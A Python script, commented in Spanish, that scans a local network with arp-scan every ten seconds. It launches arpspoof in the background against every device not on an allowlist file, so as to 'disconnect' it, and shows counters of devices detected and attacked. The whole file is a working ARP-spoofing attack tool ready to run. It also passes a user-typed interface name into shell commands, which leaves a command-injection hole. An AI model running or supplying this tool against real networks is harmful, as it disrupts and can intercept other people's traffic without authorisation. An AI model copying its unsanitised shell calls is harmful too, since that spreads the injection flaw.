import subprocess
import time
import os
import re

# Archivo donde se almacenan las IPs permitidas
ALLOWED_IPS_FILE = 'permitted_ip.txt'

# Contadores
unknown_ips_counter = 0  # Contador de IPs desconocidas detectadas
disconnected_ips_counter = 0  # Contador de IPs desconocidas desconectadas

# Diccionario para rastrear el estado de las IPs desconocidas
unknown_ips_status = {}

# Función para leer las IPs permitidas desde el archivo
def load_allowed_ips():
    if os.path.exists(ALLOWED_IPS_FILE):
        with open(ALLOWED_IPS_FILE, 'r') as file:
            allowed_ips = {line.strip() for line in file.readlines()}
        return allowed_ips
    else:
        print("[ERROR] El archivo de IPs permitidas no existe.")
        exit(1)

# Función para ejecutar un comando de shell
def run_command(command):
    try:
        result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return result.stdout.decode('utf-8'), result.stderr.decode('utf-8')
    except subprocess.CalledProcessError as e:
        return None, None

# Función para realizar el escaneo de la red
def scan_network(interface):
    command = f"arp-scan -I {interface} --localnet"
    output, _ = run_command(command)
    return output

# Función para realizar ARP Spoofing a una IP desconocida
def arpspoof(ip, gateway, interface):
    global disconnected_ips_counter
    print(f"[INFO] Ejecutando ARP Spoofing a {ip}...")
    command = f"arpspoof -i {interface} -t {ip} {gateway}"
    subprocess.Popen(command, shell=True)  # Ejecutar en segundo plano
    disconnected_ips_counter += 1

# Función para mostrar los contadores
def show_counters(detected, disconnected):
    os.system('clear')  # Limpiar pantalla
    print(f"\033[93m[!] Monitoreo en tiempo real\033[0m")
    print(f"\033[92m[+] IPs desconocidas detectadas: {detected}\033[0m")
    print(f"\033[91m[+] IPs desconocidas desconectadas: {disconnected}\033[0m")
    print("\n\033[94mEscaneando la red... presiona Ctrl+C para salir.\033[0m")

# Función principal
def main():
    global unknown_ips_counter, disconnected_ips_counter, unknown_ips_status

    # Cargar las IPs permitidas
    allowed_ips = load_allowed_ips()

    # Obtener la interfaz de red desde el usuario
    interface = input("\033[93m[?] Ingresa la interfaz de red (ejemplo: wlan0): \033[0m").strip()
    if not interface:
        print("\033[31m[-] La interfaz no puede estar vacía. Saliendo...\033[0m")
        exit(1)

    print("\033[94m[+] Comenzando monitoreo...\033[0m")

    while True:
        # Escanear la red
        network_output = scan_network(interface)

        # Buscar IPs activas en la salida del arp-scan
        found_ips = re.findall(r"(\d+\.\d+\.\d+\.\d+)", network_output)

        # Filtrar las IPs desconocidas
        for ip in found_ips:
            if ip not in allowed_ips:
                # Registrar la IP desconocida si no ha sido detectada antes
                if ip not in unknown_ips_status:
                    unknown_ips_counter += 1
                    unknown_ips_status[ip] = False  # Marcar como no desconectada

                # Si la IP sigue activa, ejecutar el ataque ARP Spoofing
                if not unknown_ips_status[ip]:
                    gateway = ip.rsplit('.', 1)[0] + '.1'  # Suponemos que la puerta de enlace es la IP x.x.x.1
                    arpspoof(ip, gateway, interface)
                    unknown_ips_status[ip] = True  # Marcar como desconectada

        # Mostrar los contadores actualizados
        show_counters(unknown_ips_counter, disconnected_ips_counter)

        # Esperar 10 segundos antes de volver a escanear
        time.sleep(10)

# Ejecutar el script principal
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\033[31m[-] Interrupción detectada. Saliendo...\033[0m")
        exit(0)
